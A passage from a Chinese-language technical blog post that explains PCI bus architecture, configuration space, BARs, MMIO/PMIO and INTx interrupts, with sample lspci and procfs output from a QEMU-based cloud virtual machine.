及各种设备都通过这跟总线进行通信</p><p>总线按功能可以分为以下三种类型：</p><ul><li><strong>片内总线</strong>：芯片内的总线，位于 CPU 内部，用以在寄存器与寄存器、寄存器与 ALU 之间进行数据交换</li><li><strong>系统总线</strong>：计算机系统内各功能单元（CPU、主存、I&#x2F;O）之间的公共通信干线，也称之为 <em>内总线</em></li><li><strong>通信总线</strong>：用于计算机系统之间或是计算机系统与其他系统（例如远程通信设备）之间进行通信的总线，也称之为 <em>外总线</em></li></ul><p>总线是可以扩展的，即可以存在多个不同类型的总线相连，不同的设备接入到不同类型的总线上</p><p><img src="https://s2.loli.net/2022/07/21/fWTEztvhuXAqN8d.png" alt="image.png"></p><h2 id="二、PCI-概念简述"><a href="#二、PCI-概念简述" class="headerlink" title="二、PCI 概念简述"></a>二、PCI 概念简述</h2><p>PCI 即 <code>Peripheral Component Interconnect</code>，是一种<strong>连接电脑主板和外部设备的总线标准</strong>，其通过多根 PCI bus 完成 CPU 与 多个 PCI 设备间的连接，，在 X86 硬件体系结构中几乎所有的设备都以各种形式连接到 PCI 设备树上</p><p><code>PCI express</code> 是新一代的总线标准，它沿用既有的PCI编程概念及信号标准，并且构建了更加高速的串行通信系统标准</p><p>我们首先明确 PCI 标准中的三个基本组件：</p><ul><li><strong>PCI 设备</strong>（device）：符合 PCI 总线标准的设备都可以称之为 PCI 设备，在一个 PCI 总线上可以包含多个 PCI 设备</li><li><strong>PCI 总线</strong>（bus）：用以连接多个 PCI 设备与多个 PCI 桥的通信干道</li><li><strong>PCI 桥</strong>（bridge）：总线之间的<strong>连接枢纽</strong>，主要有以下三种：<ul><li>HOST&#x2F;PCI 桥：也称为 PCI 主桥或者 PCI 总线控制器，用以连接 CPU 与 PCI 根总线，<strong>隔离设备地址空间与存储器地址空间</strong>，现代 PC 通常还会在其中集成内存控制器，称之为<strong>北桥芯片组</strong>（North Bridge Chipset）</li><li>PCI&#x2F;ISA 桥：用于连接旧的 ISA 总线，通常还会集成中断控制器（如 i8359A），称之为<strong>南桥芯片组</strong>（South Bridge Chipset）</li><li>PCI-to-PCI 桥：用于连接 PCI 主总线（Primary Bus）与次总线（Secondary Bus）</li></ul></li></ul><p>PCI采用树形拓扑结构，一个典型的 PCI 架构如下图所示，由一个 <code>PCI Host Bus</code> 负责总的通信， 在 Host Bus 下挂载着一个或多个 <code>PCI Root Bridge</code>，一个 <code>PCI Root Bridge</code> 管理一个 <code>PCI Local Bus</code> 空间，挂载着一颗 PCI 总线树：</p><p><img src="https://s2.loli.net/2022/08/30/LI1ayCdsB2qNWb4.png" alt="image.png"></p><p>由此，一个多层 PCI 总线结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/7rT3aEytb2lumZP.png" alt="image.png"></p><p>我们来看一个现实中的经典例子，以下图的 <code>Intel 440FX</code> 芯片组为例，PCI Host Bridge 分隔开了存储器域与 PCI 设备域，<strong>其分别使用独立的地址空间</strong>：</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>在 Linux 下我们可以使用 <code>lspci</code> 指令查看插在当前机器的 PCI bus 上的 PCI 设备，使用 <code>-t</code> 参数查看树形结构，<code>-v</code> 参数可以查看详细信息：</p><blockquote><p>这里展示的结果有 virtio 设备是因为笔者是在阿里云学生机上使用的命令，这类机器一般其实都是用 Qemu 跑的虚拟机</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci</span><br>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)<br>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)<br>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)<br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device<br>00:04.0 Communication controller: Red Hat, Inc. Virtio console<br>00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device<br>00:06.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -t -v</span><br>-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]<br>           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>           +-01.2  Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II]<br>           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI<br>           +-02.0  Cirrus Logic GD 5446<br>           +-03.0  Red Hat, Inc. Virtio network device<br>           +-04.0  Red Hat, Inc. Virtio console<br>           +-05.0  Red Hat, Inc. Virtio block device<br>           \-06.0  Red Hat, Inc. Virtio memory balloon<br></code></pre></td></tr></table></figure><p>我们还可以使用 <code>lshw -businfo</code> 命令来获取设备信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo lshw -businfo</span><br>[sudo] password for arttnba3:<br>Bus info          Device       Class          Description<br>=========================================================<br>                               system         Alibaba Cloud ECS<br>                               bus            Motherboard<br>                               memory         96KiB BIOS<br>cpu@0                          processor      Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz<br>                               memory         2GiB System Memory<br>                               memory         2GiB DIMM RAM<br>pci@0000:00:00.0               bridge         440FX - 82441FX PMC [Natoma]<br>pci@0000:00:01.0               bridge         82371SB PIIX3 ISA [Natoma/Triton II]<br>pci@0000:00:01.1               storage        82371SB PIIX3 IDE [Natoma/Triton II]<br>pci@0000:00:01.2               bus            82371SB PIIX3 USB [Natoma/Triton II]<br>usb@1             usb1         bus            UHCI Host Controller<br>usb@1:1                        input          QEMU USB Tablet<br>pci@0000:00:01.3               bridge         82371AB/EB/MB PIIX4 ACPI<br>pci@0000:00:02.0               display        GD 5446<br>pci@0000:00:03.0               network        Virtio network device<br>virtio@0          eth0         network        Ethernet interface<br>pci@0000:00:04.0               communication  Virtio console<br>virtio@1                       generic        Virtual I/O device<br>pci@0000:00:05.0               storage        Virtio block device<br>virtio@2          /dev/vda     disk           42GB Virtual I/O device<br>virtio@2,1        /dev/vda1    volume         39GiB EXT4 volume<br>pci@0000:00:06.0               generic        Virtio memory balloon<br>virtio@3                       generic        Virtual I/O device<br>                               system         PnP device PNP0b00<br>                               input          PnP device PNP0303<br>                               input          PnP device PNP0f13<br>                               storage        PnP device PNP0700<br>                               communication  PnP device PNP0501<br>                  veth073b1a5  network        Ethernet interface<br>                  veth2c8670f  network        Ethernet interface<br>                  vethc0202a2  network        Ethernet interface<br>                  veth49e878e  network        Ethernet interface<br></code></pre></td></tr></table></figure><p>PCI 设备是在内核启动初始化阶段进行枚举的，这个时候可能有的设备还没准备好，从而没被枚举到，这种情况下我们可以使用如下命令重新进行设备枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="三、PCI-设备编号"><a href="#三、PCI-设备编号" class="headerlink" title="三、PCI 设备编号"></a>三、PCI 设备编号</h2><p>每个PCI 设备都有着三个编号：<strong>总线编号（Bus Number）、设备编号（Device Number）与功能编号（Function Number）</strong>，作为设备的唯一标识；在此之上还有 <strong>PCI 域</strong>的概念，一个 PCI 域上最多可以连接 256 根 PCI 总线</p><p>当我们使用 <code>lspci</code> 命令查看 PCI 设备信息时，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v </code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号</p><h2 id="四、PCI-设备配置空间"><a href="#四、PCI-设备配置空间" class="headerlink" title="四、PCI 设备配置空间"></a>四、PCI 设备配置空间</h2><p>每个 PCI 逻辑设备中都有着其自己的<strong>配置空间</strong>（configuration space），通常是设备地址空间的前 64 字节（新版的设备还扩展了 0x40~0xFF 这段配置空间），其中存放了一些设备的基本信息，如生厂商信息、IRQ中断号、mem 空间与 io 空间的起始地址与大小等</p><p>Intel 芯片组中我们可以使用 IO 空间的 <code>CF8/CFC</code> 地址（端口）来访问 PCI 设备的配置寄存器：</p><ul><li><code>CF8</code>：<strong>CONFIG_ADDRESS</strong>，即 PCI 配置空间地址端口。</li><li><code>CFH</code>：<strong>CONFIG_DATA</strong>，即 PCI 配置空间数据端口。</li></ul><p>当我们往 <code>CONFIG_ADDRESS</code> 端口填入对应的设备标识后，就可以从 <code>CONFIG_DATA</code> 端口上读写 PCI 配置空间的内存， <code>CONFIG_ADDRESS</code> 端口的格式如下：</p><ul><li><code>31</code> 位：Enable 位</li><li><code>23:16</code> 位：总线编号</li><li><code>15:11</code> 位：设备编号</li><li><code>10:8</code> 位：功能编号</li><li><code>7:2</code> 位：配置空间寄存器编号</li><li><code>1:0</code> 位：恒为 <code>00</code></li></ul><blockquote><p>除了通过端口访问外，我们也可以通过 MMIO 的方式访问一个 PCI 设备的地址空间</p></blockquote><p>现在我们来看 PCI 配置空间的结构，PCI 设备分为 <code>Bridge</code> 与 <code>Agent</code> 两类，故配置空间也分为相应的两类</p><p>Agent 类型配置空间又被称为 <code>Type 00h</code>，格式如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/CEpqkAM1D78XRLG.png" alt="image.png"></p><p>相应地，Bridge 类型配置空间被称为 <code>Type 01h</code>，与 Agent 类型配置空间大同小异：</p><p><img src="https://s2.loli.net/2022/07/21/emyrRVo5W6X12aG.png" alt="image.png"></p><p>简单介绍几个比较重要的字段：</p><ul><li><p>设备标识相关：</p><ul><li><p><code>Vendor ID</code>：生产厂商的 ID，例如 Intel 设备通常为 <code>0x8086</code></p></li><li><p><code>Device ID</code>：具体设备的 ID，通常也是由厂家自行指定的</p></li><li><p><code>Class Code</code>：类代码，用于区分设备类型</p></li><li><p><code>Revision ID</code>：PCI 设备的版本号，可以看作 Device ID 的扩展</p></li></ul></li><li><p>设备状态相关：</p><ul><li><p><code>Status</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/ZTplAr87OQ96cRU.png" alt="image.png"></p></li><li><p><code>Command</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/rM3YhuaoPK25mNn.png" alt="image.png"></p></li></ul></li><li><p>设备配置相关：</p><ul><li><p><code>Base Address Registers</code>：决定了 PCI 设备空间映射到系统空间的具体位置，有两种映射方式：MMIO 与 PMIO，映射方式由最低位决定，不可更改</p></li><li><p><code>Interrupt Pin</code>：中断引脚，该寄存器表示设备所连接的引脚</p></li><li><p><code>Interrupt Line</code>：中断编号</p></li></ul></li></ul><p>前面我们讲到 lspci 命令，我们可以使用 <code>-s</code> 来通过指定查看的具体 PCI 设备，通过 <code>-m</code> 查看部分信息，通过 <code>-nn</code> 查看比较详细的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -m</span><br>Device: 00:02.0<br>Class:  VGA compatible controller<br>Vendor: Cirrus Logic<br>Device: GD 5446<br>SVendor:        Red Hat, Inc.<br>SDevice:        QEMU Virtual Machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -nn</span><br>00:02.0 VGA compatible controller [0300]: Cirrus Logic GD 5446 [1013:00b8] (prog-if 00 [VGA controller])<br>        Subsystem: Red Hat, Inc. QEMU Virtual Machine [1af4:1100]<br>        Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-<br>        Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-<br>        Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M]<br>        Region 1: Memory at febd0000 (32-bit, non-prefetchable) [size=4K]<br>        Expansion ROM at 000c0000 [disabled] [size=128K]<br>        Kernel driver in use: cirrus<br>        Kernel modules: cirrusfb, cirrus<br></code></pre></td></tr></table></figure><p>我们还可以直接使用 <code>-x</code> 参数来查看 PCI 设备的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -s 00:02.0 -x</span><br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00<br>10: 08 00 00 fc 00 00 bd fe 00 00 00 00 00 00 00 00<br>20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11<br>30: 00 00 bc fe 00 00 00 00 00 00 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>在 Linux 当中我们也可以通过 procfs 或 sysfs 这样的文件系统来查看设备的相关配置信息，例如通过 <code>/proc/bus/pci/00/00.0</code> 文件我们同样可以查看 PCI 设备 <code>00:02.0</code> 的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/bus/pci/00/02.0 | xxd</span><br>00000000: 1310 b800 0301 0000 0000 0003 0000 0000  ................<br>00000010: 0800 00fc 0000 bdfe 0000 0000 0000 0000  ................<br>00000020: 0000 0000 0000 0000 0000 0000 f41a 0011  ................<br>00000030: 0000 bcfe 0000 0000 0000 0000 0000 0000  ................<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0/resource</code> 获取到的信息中每行表示一个地址空间，其中第一行为 MMIO，第二行为 PMIO，三列信息分别为起始地址、终止地址、标志位 ，：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:02.0/resource</span><br>0x00000000fc000000 0x00000000fdffffff 0x0000000000042208<br>0x00000000febd0000 0x00000000febd0fff 0x0000000000040200<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x00000000000c0000 0x00000000000dffff 0x0000000000000212<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0</code> 下的其他文件也可以访问该设备的一些其他资源信息（例如通过 <code>resource0</code> 可以直接访问 MMIO 空间，<code>resource1</code> 则为其 PMIO 空间）</p><h2 id="五、PCI-Base-Address-register"><a href="#五、PCI-Base-Address-register" class="headerlink" title="五、PCI Base Address register"></a>五、PCI Base Address register</h2><h3 id="I-基本概念"><a href="#I-基本概念" class="headerlink" title="I.基本概念"></a>I.基本概念</h3><p><strong>Base Address register</strong>（BAR）是 PCI 设备配置空间中非常重要的一部分，该组寄存器（也称之为 BAR空间）用以定义 PCI <strong>需要的配置空间大小</strong>以及配置 PCI 设备<strong>占用的地址空间</strong></p><p>我们都知道与设备通信有两种方式：MMIO 与 Port IO，相应地 BAR 的格式也有如下两种：</p><ul><li><p><strong>MMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/CzV32oBP71at9Fg.png" alt="image.png"></p></li><li><p><strong>PMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/w4ind36EF9pPLcy.png" alt="image.png"></p></li></ul><h3 id="II-BAR-的初始化"><a href="#II-BAR-的初始化" class="headerlink" title="II. BAR 的初始化"></a>II. BAR 的初始化</h3><p>当 PCI 设备复位后，其会在 BAR 中存放该设备所需使用的资源类型与大小，当操作系统对 PCI 总线进行配置时，首先会获取到 PCI 设备的 BAR 中的初始信息，之后根据该初始信息分配合理的 <strong>PCI 总线域地址</strong>，将其<strong>写回到 BAR 当中</strong></p><p>通过 BAR 进行资源分配的具体过程如下：</p><ul><li>当 PCI 复位时，其会向 BAR 中写入资源信息，<strong>通过将低位的 bit 设置为 read only 的 0 来标识最小地址空间大小</strong></li><li>系统软件（例如 BIOS）通过向 BAR 写一个<strong>所有 bit 都为 1 的值</strong>来确定从哪个 bit 开始是可写的，从而获取到该 BAR 对应所需的<strong>最小地址空间</strong>，同时通过最低位来获取到 BAR 的类型，并对应为这些 BAR 空间分配地址，<strong>并将分配的地址写回 BAR 空间中</strong></li></ul><blockquote><p> 比如说低 20 bit 都不可写，那就是说这个 bar 所需要的地址空间最小为 1MB，最后从地址总线上分配一个1MB 对齐的地址写回 bar 里</p></blockquote><h3 id="III-处理器域与-PCI-域间访问"><a href="#III-处理器域与-PCI-域间访问" class="headerlink" title="III. 处理器域与 PCI 域间访问"></a>III. 处理器域与 PCI 域间访问</h3><p>需要注意的一点是，<strong>处理器使用存储器域的地址，而 BAR 寄存器存放 PCI 总线域的地址</strong>，因此处理器不能直接通过 <code>BAR + offset</code> 的方式访问 PCI 设备的 BAR 空间，而应当要<strong>将 PCI 总线域的地址转换为存储器域的地址</strong></p><p>由此，PCI BAR 中地址在存储器域中皆有着相应的映像，当处理器访问 PCI 设备的地址空间时，首先访问该设备在存储器域中的地址空间，之后通过 HOST 主桥将存储器域上地址空间转换为 PCI 总线域的地址空间，最后通过 PCI 总线将数据发送到指定的设备中</p><p>反之亦然，当 PCI 设备需要访问存储器域的地址空间时（DMA 操作），首先需要访问该存储器地址空间所对应的 PCI 总线空间，之后通过 HOST 主桥将其转换为存储器地址空间，再由 DDR 控制器完成对存储器的读写</p><h2 id="六、PCI-设备内存-amp-端口空间与访问方式"><a href="#六、PCI-设备内存-amp-端口空间与访问方式" class="headerlink" title="六、PCI 设备内存 &amp; 端口空间与访问方式"></a>六、PCI 设备内存 &amp; 端口空间与访问方式</h2><p>前面我们讲了 PCI 设备与特性和配置相关的配置空间，现在我们来看与 PCI 设备与实际操作相关的内存映射空间与端口映射空间</p><p>所有 IO 设备的内存与端口空间需要被映射到对应的地址空间&#x2F;端口空间中才能访问，这需要占用部分的内存地址空间与端口地址空间，即我们有两种映射外设资源的方式：</p><ul><li><strong>MMIO</strong>（Memory-mapped I&#x2F;O）：即内存映射 IO。这种方式将 IO 设备的内存与寄存器映射到指定的内存地址空间上，此时我们便可以通过常规的访问内存的方式来直接访问到设备的寄存器与内存</li><li><strong>PMIO</strong>（Port-mapped I&#x2F;O）：即端口映射 IO。这种方式将 IO 设备的寄存器编码到指定的端口上，我们需要通过访问端口的方式来访问设备的寄存器与内存（例如在 x86 下通过 <code>in</code> 与 <code>out</code> 这一类的指令可以读写端口）。IO 设备通过专用的针脚或者专用的总线与 CPU 连接，这与内存地址空间相独立，因此又称作 isolated I&#x2F;O</li></ul><p>完成映射之后通过相应的内存&#x2F;端口访问到的便是 PCI 设备的内存&#x2F;端口地址空间</p><blockquote><p>例如实模式下的 <code>0xA0000 ~ 0xBFFFF</code> 这 128KB 地址空间通常被用作显存的映射，当我们在实模式下读写这块区域时通常便是直接读写显卡上的显存，而并非普通的内存</p></blockquote><p>通过 procfs 的 <code>/proc/iomem</code> 我们可以查看物理地址空间的情况，其中我们便能看到各种设备所占用的地址空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/iomem</span><br>00000000-00000fff : Reserved<br>00001000-0009fbff : System RAM<br>0009fc00-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000c91ff : Video ROM<br>000c9800-000ca1ff : Adapter ROM<br>000ca800-000ccbff : Adapter ROM<br>000f0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7ffdffff : System RAM<br>  1f400000-20200e70 : Kernel code<br>  20200e71-2105843f : Kernel data<br>  2132b000-217fffff : Kernel bss<br>7ffe0000-7fffffff : Reserved<br>80000000-febfffff : PCI Bus 0000:00<br>  fc000000-fdffffff : 0000:00:02.0<br>    fc000000-fdffffff : cirrus<br>  feb80000-febbffff : 0000:00:03.0<br>  febd0000-febd0fff : 0000:00:02.0<br>    febd0000-febd0fff : cirrus<br>  febd1000-febd1fff : 0000:00:03.0<br>  febd2000-febd2fff : 0000:00:04.0<br>  febd3000-febd3fff : 0000:00:05.0<br>fec00000-fec003ff : IOAPIC 0<br>fee00000-fee00fff : Local APIC<br>feffc000-feffffff : Reserved<br>fffc0000-ffffffff : Reserved<br></code></pre></td></tr></table></figure><p>通过 procfs 的 <code>/proc/ioports</code> 我们可以查看 IO 端口情况，其中便包括各种设备对应的 PMIO 端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/ioports</span><br>0000-0cf7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>  0170-0177 : 0000:00:01.1<br>    0170-0177 : ata_piix<br>  01f0-01f7 : 0000:00:01.1<br>    01f0-01f7 : ata_piix<br>  0376-0376 : 0000:00:01.1<br>    0376-0376 : ata_piix<br>  03f2-03f2 : floppy<br>  03f4-03f5 : floppy<br>  03f6-03f6 : 0000:00:01.1<br>    03f6-03f6 : ata_piix<br>  03f7-03f7 : floppy<br>  03f8-03ff : serial<br>  0505-0505 : QEMU0001:00<br>  0510-051b : QEMU0002:00<br>    0510-051b : fw_cfg_io<br>  0600-063f : 0000:00:01.3<br>    0600-0603 : ACPI PM1a_EVT_BLK<br>    0604-0605 : ACPI PM1a_CNT_BLK<br>    0608-060b : ACPI PM_TMR<br>  0700-070f : 0000:00:01.3<br>    0700-0708 : piix4_smbus<br>0cf8-0cff : PCI conf1<br>0d00-adff : PCI Bus 0000:00<br>ae0f-aeff : PCI Bus 0000:00<br>af20-afdf : PCI Bus 0000:00<br>afe0-afe3 : ACPI GPE0_BLK<br>afe4-ffff : PCI Bus 0000:00<br>  c000-c03f : 0000:00:05.0<br>    c000-c03f : virtio-pci-legacy<br>  c040-c05f : 0000:00:01.2<br>    c040-c05f : uhci_hcd<br>  c060-c07f : 0000:00:03.0<br>    c060-c07f : virtio-pci-legacy<br>  c080-c09f : 0000:00:04.0<br>    c080-c09f : virtio-pci-legacy<br>  c0a0-c0bf : 0000:00:06.0<br>    c0a0-c0bf : virtio-pci-legacy<br>  c0c0-c0cf : 0000:00:01.1<br>    c0c0-c0cf : ata_piix<br></code></pre></td></tr></table></figure><h2 id="七、PCI-中断机制"><a href="#七、PCI-中断机制" class="headerlink" title="七、PCI 中断机制"></a>七、PCI 中断机制</h2><p>PCI 设备有两种打中断的方法：传统的 INTx 中断与 MSI 中断，出于兼容的需要 PCIe 完全继承了这个特性</p><h3 id="I-INTx-中断"><a href="#I-INTx-中断" class="headerlink" title="I. INTx 中断"></a>I. INTx 中断</h3><p>INTx 类型的中断即传统的<strong>通过中断引脚来产生的中断</strong>，PCI 总线使用 <code>INTA#</code> 、<code>INTB#</code> 、<code>INTC#</code> 、<code>INTD#</code>  信号（低电平有效）向处理器发出中断请求，不过多数设备仅使用 <code>INTA#</code> 信号</p><p>下图为一个产生  <code>INTA#</code> 中断信号的流程：</p><ul><li>设备向南桥上的中断控制器打一个  <code>INTA#</code> ，中断控制器转为 <code>INTR</code> 信号后通过 APIC bus 打向处理器</li><li>接受中断信号的处理器（未设置则默认都打到 CPU0）通过中断向量表执行对应的处理程序</li></ul><p><img src="https://s2.loli.net/2022/08/31/32jbJDlOpRKSIqy.png" alt="image.png"></p><p>在 PCI 总线中，设备的 <code>INTx 引脚</code>最终要连接到中断控制器的 <code>IRQ 引脚</code> ，下图是一个三 PCI 插槽与中断控制器引脚进行连接的例子：</p><p><img src="https://s2.loli.net/2022/08/31/ZyIur4L7U5oCjJO.png" alt="知乎偷的图"></p><p>还记得我们前文所讲的 PCI 配置空间中的 <code>Interrupt Pin</code> 与 <code>Interrupt Line</code> 域吗？现在我们可以进一步明确其具体用途了：</p><ul><li><code>Interrupt Pin</code>：记录设备应该使用哪一个 INTx 中断信号</li><li><code>Interrupt Line</code>：记录设备连接的引脚</li></ul><p><img src="https://s2.loli.net/2022/08/31/jbtsuypMvza9Nex.png" alt="image.png"></p><h3 id="II-MSI-x2F-MSI-X-中断"><a 